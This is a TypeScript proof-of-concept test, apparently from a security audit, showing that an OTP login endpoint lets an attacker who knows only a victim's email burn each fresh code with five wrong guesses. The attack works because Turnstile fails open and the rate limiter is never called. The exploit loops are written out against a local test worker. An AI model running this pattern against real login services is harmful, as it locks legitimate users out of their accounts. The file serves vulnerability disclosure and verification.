/**
 * p10-005 PoC — OTP verify-code failure path burns the victim's only active code.
 * NOT part of the project test suite.
 *
 * Runs the REAL worker (src/worker.ts) in workerd against local D1 with the
 * production migration schema, under default config (TURNSTILE_SECRET_KEY
 * unset => Turnstile fail-open at auth.ts:186-188; AUTH_RATE_LIMITER is
 * declared in wrangler.toml but has zero call sites, so no IP throttle).
 *
 * Control: send-code then verify-code with the real (captured) code mints a
 * session — normal login works.
 *
 * Exploit cycle (repeatable): send-code issues a fresh code C to the victim;
 * attacker submits 5 arbitrary wrong codes for that email; the failure-path
 * UPDATE (auth.ts:362-374) increments attempt_count on the single active code
 * and auto-invalidates it at the 5th miss; the victim's legitimate code C now
 * returns 401 "Invalid or expired code" — targeted login DoS with nothing but
 * the victim's email address.
 */
import '../src/cloudflare-test.d.ts';
import { describe, it, expect, beforeAll } from 'vitest';
import { env, createExecutionContext, waitOnExecutionContext } from 'cloudflare:test';
import worker from '../src/worker';

function req(path: string, body: string): Request {
  return new Request(`https://omg-api.latham.cloud${path}`, {
    method: 'POST',
    headers: new Headers({ 'Content-Type': 'application/json' }),
    body,
  });
}

async function dispatch(request: Request): Promise<Response> {
  const context = createExecutionContext();
  const response = await worker.fetch(request, env, context);
  await waitOnExecutionContext(context);
  return response;
}

const VICTIM_EMAIL = 'victim@burnout.test';
const WRONG_CODES = ['000000', '111111', '222222', '333333', '444444'];

/** Plaintext codes handed to the mail binding, in delivery order. */
function mailedCodes(): string[] {
  return (globalThis as { __mailedCodes?: string[] }).__mailedCodes ?? [];
}

function lastMailedCode(): string {
  const codes = mailedCodes();
  if (codes.length === 0) throw new Error('mailer stub captured no code');
  return codes[codes.length - 1];
}

describe('p10-005: OTP attempt burnout login DoS', () => {
  beforeAll(() => {
    // Default production posture: Turnstile secret unset (fail-open), JWT secret set.
    (env as Record<string, unknown>).TURNSTILE_SECRET_KEY = undefined;
    (env as Record<string, unknown>).JWT_SECRET = 'p11-test-jwt-secret';
    // Stub send_email binding; capture each plaintext OTP as "delivered to inbox".
    (globalThis as Record<string, unknown>).__mailedCodes = [];
    (env as Record<string, unknown>).EMAIL = {
      send: async (message: { text: string }) => {
        const match = /code is (\d{6})/.exec(message.text);
        if (match) mailedCodes().push(match[1]);
      },
    };
  });

  it('control: legitimate login with the real code mints a session', async () => {
    const send = await dispatch(req('/api/auth/send-code', JSON.stringify({ email: VICTIM_EMAIL })));
    expect(send.status).toBe(200);
    const realCode = lastMailedCode();
    const res = await dispatch(
      req('/api/auth/verify-code', JSON.stringify({ email: VICTIM_EMAIL, code: realCode }))
    );
    const body = (await res.json()) as { success?: boolean; token?: string };
    console.log(`p10-005 control: victim login with real code -> ${res.status} (token minted: ${Boolean(body.token)})`);
    expect(res.status).toBe(200);
    expect(body.token).toBeTruthy();
  });

  it('exploit: 5 wrong codes from the attacker invalidate the victim\'s fresh code', async () => {
    // Victim requests a code (or attacker triggers it via send-code).
    await dispatch(req('/api/auth/send-code', JSON.stringify({ email: VICTIM_EMAIL })));
    const freshCode = lastMailedCode();

    // Attacker, knowing only the email, submits 5 arbitrary wrong codes.
    const attackerStatuses: number[] = [];
    for (const code of WRONG_CODES) {
      const r = await dispatch(
        req('/api/auth/verify-code', JSON.stringify({ email: VICTIM_EMAIL, code }))
      );
      attackerStatuses.push(r.status);
    }
    console.log('p10-005 attacker wrong-code statuses:', attackerStatuses.join(','));

    // Ground truth from D1: the victim's active code was burned.
    // Ground truth: exactly one code for this email carries the attacker's misses.
    const row = await env.DB.prepare(
      `SELECT MAX(attempt_count) AS attempts,
              SUM(CASE WHEN attempt_count >= ? THEN 1 ELSE 0 END) AS burned
       FROM auth_codes WHERE email = ?`
    )
      .bind(WRONG_CODES.length, VICTIM_EMAIL)
      .first<{ attempts: number; burned: number }>();
    console.log(`p10-005 burned codes for victim: ${row?.burned} at attempt_count=${row?.attempts} (threshold 5)`);
    expect(row?.attempts).toBe(5);
    expect(row?.burned ?? 0).toBeGreaterThanOrEqual(1);

    // Victim types the REAL code from their inbox -> locked out.
    const victimRes = await dispatch(
      req('/api/auth/verify-code', JSON.stringify({ email: VICTIM_EMAIL, code: freshCode }))
    );
    const victimBody = (await victimRes.json()) as { error?: string };
    console.log(`p10-005 victim login with fresh inbox code -> ${victimRes.status} "${victimBody.error}"`);
    expect(victimRes.status).toBe(401);
    expect(victimBody.error).toContain('Invalid or expired code');
  });

  it('exploit: every replacement code is burned too — sustained lockout, no 429s', async () => {
    const cycles: string[] = [];
    let wrongCodeRequests = 0;
    let throttled = 0;

    for (let cycle = 0; cycle < 2; cycle++) {
      // Victim requests a replacement code.
      await dispatch(req('/api/auth/send-code', JSON.stringify({ email: VICTIM_EMAIL })));
      const replacement = lastMailedCode();

      // Attacker burns it with 5 junk submissions.
      for (const code of WRONG_CODES) {
        wrongCodeRequests++;
        const r = await dispatch(
          req('/api/auth/verify-code', JSON.stringify({ email: VICTIM_EMAIL, code }))
        );
        if (r.status === 429) throttled++;
      }

      // Victim's legitimate attempt fails.
      const victimRes = await dispatch(
        req('/api/auth/verify-code', JSON.stringify({ email: VICTIM_EMAIL, code: replacement }))
      );
      cycles.push(`cycle${cycle + 1}: HTTP ${victimRes.status}`);
    }
    console.log(`p10-005 replacement-code logins: ${cycles.join(', ')}`);
    console.log(`p10-005 attacker verify-code requests fired: ${wrongCodeRequests}, IP throttled (429): ${throttled}`);

    expect(cycles.every(c => c.endsWith('401'))).toBe(true);
    expect(throttled).toBe(0);
  });
});
